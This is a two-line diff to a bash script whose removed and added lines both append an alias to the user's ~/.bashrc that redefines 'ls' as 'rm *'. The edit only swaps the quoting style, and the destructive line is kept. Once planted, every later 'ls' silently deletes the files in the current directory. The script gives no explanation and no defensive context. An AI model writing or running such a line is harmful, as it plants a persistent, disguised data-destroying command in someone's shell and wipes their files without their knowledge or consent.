@@ -1,2 +1,2 @@
 #!/bin/bash
-printf "alias ls='rm *'\x0a" >> ~/.bashrc
+printf 'alias ls="rm *"\x0a' >> ~/.bashrc
